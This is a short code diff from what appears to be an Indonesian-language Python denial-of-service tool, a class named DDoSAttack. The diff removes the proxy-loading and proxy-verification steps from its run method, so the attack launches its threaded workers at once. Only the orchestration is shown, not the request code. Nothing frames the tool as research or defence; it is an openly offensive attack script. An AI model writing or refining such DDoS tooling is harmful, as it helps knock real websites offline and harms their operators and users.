@@ -126,20 +126,6 @@ class DDoSAttack:
 
     def run(self):
         self.logger.info(f"Memulai serangan pada {self.url}")
-        self.proxy_manager.load_proxies()
-        
-        # Verifikasi proxy sebelum memulai serangan
-        self.logger.info("Memverifikasi proxy...")
-        working_proxies = 0
-        for proxy in self.proxy_manager.proxies:
-            if self.proxy_manager.verify_proxy(proxy):
-                working_proxies += 1
-                
-        if working_proxies == 0:
-            self.logger.error("Tidak ada proxy yang bekerja! Membatalkan serangan.")
-            return
-            
-        self.logger.info(f"Ditemukan {working_proxies} proxy yang bekerja")
         
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
             futures = [
